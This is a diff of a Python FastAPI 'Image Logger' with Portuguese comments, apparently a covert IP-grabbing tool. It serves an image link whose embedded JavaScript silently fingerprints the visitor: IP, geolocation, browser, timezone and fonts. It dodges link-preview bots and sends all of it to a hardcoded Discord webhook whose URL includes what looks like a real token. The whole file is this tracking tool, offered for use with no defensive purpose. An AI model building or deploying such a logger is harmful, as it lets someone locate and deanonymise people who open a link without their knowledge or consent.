@@ -1,6 +1,5 @@
 from fastapi import FastAPI, Request, BackgroundTasks
 from fastapi.responses import HTMLResponse, RedirectResponse, Response
-from fastapi import Body
 import requests
 import re
 import json
@@ -17,6 +16,7 @@ app = FastAPI()
 config = {
     "webhooks": [
         "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
+        # adiciona webhooks de fallback aqui
     ],
     "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
     "username": "Image Logger",
@@ -26,8 +26,8 @@ config = {
     "vpnCheck": 1,
     "antiBot": 1,
     "linkAlerts": True,
-    "blacklistedCountries": [],
-    "suspiciousASNs": {
+    "blacklistedCountries": [],       # ex: ["CN", "RU", "KP"]
+    "suspiciousASNs": {               # ASN watchlist — datacenter/scanner conhecidos
         "AS14061": "DigitalOcean",
         "AS16509": "AWS",
         "AS15169": "Google",
@@ -37,11 +37,11 @@ config = {
         "AS14618": "Amazon",
         "AS396982": "Google Cloud",
     },
-    "torUpdateInterval": 3600,
-    "geoapifyKey": "",
+    "torUpdateInterval": 3600,        # segundos entre refreshes da lista Tor
+    "geoapifyKey": "",                # chave Geoapify (deixa vazio pra usar staticmap)
     "logFile": "hits.jsonl",
-    "rateLimitTTL": 30,
-    "hitAlertThreshold": 2,
+    "rateLimitTTL": 30,               # segundos de janela de rate limit por IP
+    "hitAlertThreshold": 2,           # hits acima desse número geram alerta de repetição
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
@@ -54,10 +54,8 @@ _session_start: float = time.time()
 _total_hits: int = 0
 _log_path: Path = Path(config["logFile"])
 
-# fingerprint cache — aguarda POST do frontend antes de enviar embed completo
-_pending_fingerprints: TTLCache = TTLCache(maxsize=10_000, ttl=30)
 
-
+# ── Tor exit node list ──────────────────────────────────────────────
 async def refresh_tor_list():
     global _tor_exit_nodes
     while True:
@@ -78,24 +76,22 @@ async def startup():
     asyncio.create_task(refresh_tor_list())
 
 
+# ── Utilitários de IP (versão original) ────────────────────────────
 def normalize_ip(ip: str) -> str:
     mapped = re.match(r"^::ffff:(\d+\.\d+\.\d+\.\d+)$", ip, re.IGNORECASE)
     return mapped.group(1) if mapped else ip
 
 
 def extract_ip(request: Request) -> str:
-    for header in ("cf-connecting-ip", "true-client-ip", "x-real-ip"):
-        val = request.headers.get(header, "").strip()
-        if val:
-            return normalize_ip(val)
-    forwarded = request.headers.get("x-forwarded-for", "").strip()
-    if forwarded:
-        return normalize_ip(forwarded.split(",")[0].strip())
-    if request.client:
-        return normalize_ip(request.client.host)
-    return "Unknown"
+    ip = request.headers.get("x-forwarded-for") or (
+        request.client.host if request.client else "Unknown"
+    )
+    if "," in str(ip):
+        ip = ip.split(",")[0].strip()
+    return normalize_ip(ip)
 
 
+# ── Bot detection ───────────────────────────────────────────────────
 def bot_check(ip: str, useragent: str):
     if not ip:
         return False
@@ -106,6 +102,7 @@ def bot_check(ip: str, useragent: str):
     return False
 
 
+# ── Headless browser detection ──────────────────────────────────────
 def detect_headless(useragent: str, hints: dict) -> bool:
     if hints.get("sec_ch_ua") == "Unknown" and hints.get("accept_language") in ("*", "Unknown"):
         return True
@@ -115,6 +112,7 @@ def detect_headless(useragent: str, hints: dict) -> bool:
     return False
 
 
+# ── User agent parsing ──────────────────────────────────────────────
 def parse_useragent(raw_ua: str) -> dict:
     ua = ua_parse(raw_ua)
     os_str = ua.os.family + (f" {ua.os.version_string}" if ua.os.version_string else "")
@@ -129,6 +127,7 @@ def parse_useragent(raw_ua: str) -> dict:
     return {"os": os_str, "browser": browser_str, "device": device, "is_bot": ua.is_bot}
 
 
+# ── Client hints ────────────────────────────────────────────────────
 def collect_hint_headers(request: Request) -> dict:
     h = request.headers
     return {
@@ -141,6 +140,7 @@ def collect_hint_headers(request: Request) -> dict:
     }
 
 
+# ── Mapa estático ───────────────────────────────────────────────────
 def build_map_url(lat: float, lon: float) -> str | None:
     if config["geoapifyKey"]:
         return (
@@ -157,6 +157,7 @@ def build_map_url(lat: float, lon: float) -> str | None:
     )
 
 
+# ── Webhook com fallback ────────────────────────────────────────────
 def send_webhook(payload: dict) -> bool:
     for webhook_url in config["webhooks"]:
         try:
@@ -168,6 +169,7 @@ def send_webhook(payload: dict) -> bool:
     return False
 
 
+# ── Log local JSONL ─────────────────────────────────────────────────
 def append_log(record: dict):
     try:
         with _log_path.open("a", encoding="utf-8") as f:
@@ -176,6 +178,7 @@ def append_log(record: dict):
         pass
 
 
+# ── Core report ─────────────────────────────────────────────────────
 def build_and_send_embed(ip: str, useragent: str, hints: dict,
                           fp: dict, endpoint: str = "/api/image"):
     global _total_hits
@@ -189,6 +192,24 @@ def build_and_send_embed(ip: str, useragent: str, hints: dict,
     _hit_timestamps[ip].append(time.time())
     _total_hits += 1
     hit_count = _hit_counter[ip]
+
+    bot = bot_check(ip, useragent)
+    if bot:
+        if config["linkAlerts"]:
+            send_webhook({
+                "username": config["username"],
+                "embeds": [{
+                    "title": "Image Logger — Link Enviado",
+                    "color": config["color"],
+                    "description": (
+                        f"**Link foi enviado!**\n\n"
+                        f"**Endpoint:** `{endpoint}`\n"
+                        f"**IP:** `{ip}`\n"
+                        f"**Plataforma:** `{bot}`"
+                    )
+                }]
+            })
+        return
 
     if in_window and hit_count > 1:
         if hit_count >= config["hitAlertThreshold"]:
@@ -251,14 +272,12 @@ def build_and_send_embed(ip: str, useragent: str, hints: dict,
     timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
     risk_flags = []
-    if is_tor:           risk_flags.append("🧅 Tor Exit Node")
-    if info.get("proxy"): risk_flags.append("🔒 VPN/Proxy")
-    if info.get("hosting"): risk_flags.append("🖥️ Datacenter")
-    if is_headless:      risk_flags.append("🤖 Headless Browser")
-    if asn_tag:          risk_flags.append(f"⚠️ ASN Suspeito{asn_tag}")
-    risk_line = " | ".join(risk_flags) if risk_flags else "✅ Nenhum"
+    if is_tor:                risk_flags.append("🧅 Tor Exit Node")
+    if info.get("proxy"):     risk_flags.append("🔒 VPN/Proxy")
+    if info.get("hosting"):   risk_flags.append("🖥️ Datacenter")
+    if is_headless:           risk_flags.append("🤖 Headless Browser")
+    if asn_tag:               risk_flags.append(f"⚠️ ASN Suspeito{asn_tag}")
 
-    # Timezone cruzado — OS vs IP
     ip_tz = info.get("timezone", "Unknown")
     browser_tz = fp.get("timezone", "Unknown")
     tz_mismatch = (
@@ -268,7 +287,8 @@ def build_and_send_embed(ip: str, useragent: str, hints: dict,
     )
     if tz_mismatch:
         risk_flags.append("🕐 Timezone Mismatch")
-        risk_line = " | ".join(risk_flags)
+
+    risk_line = " | ".join(risk_flags) if risk_flags else "✅ Nenhum"
 
     description = f"""**Um usuário abriu a imagem original!**
 
@@ -329,7 +349,6 @@ def build_and_send_embed(ip: str, useragent: str, hints: dict,
 
 **User Agent:**
 ```
-
 {useragent}
 ```"""
 
@@ -427,7 +446,6 @@ async def logger(request: Request, background_tasks: BackgroundTasks):
             return Response(content=b"", media_type="image/jpeg")
         return RedirectResponse(url=config["image"], status_code=302)
 
-    # HTML serve a imagem e coleta fingerprint passivo em background
     html = f"""<!DOCTYPE html>
 <html>
 <head><meta charset="utf-8"><title></title></head>
@@ -540,7 +558,6 @@ async def logger(request: Request, background_tasks: BackgroundTasks):
     const testFonts = [
       'Arial','Times New Roman','Courier New','Georgia','Verdana',
       'Trebuchet MS','Impact','Comic Sans MS',
-      // Fontes regionais — revelam localização
       'Noto Sans CJK SC','MS Gothic','Malgun Gothic','Arial Unicode MS',
       'Tahoma','Calibri','Segoe UI','Roboto','Ubuntu','Helvetica Neue',
       'SimSun','MingLiU','BatangChe','Gulim','Dotum',
@@ -554,7 +571,7 @@ async def logger(request: Request, background_tasks: BackgroundTasks):
     fp.fonts = detected.join(', ') || 'Nenhuma detectada';
   }} catch(e) {{ fp.fonts = 'Unknown'; }}
 
-  // Envia pro backend — silencioso, sem interação do usuário
+  // Envia pro backend silenciosamente
   try {{
     await fetch('/api/fp', {{
       method: 'POST',
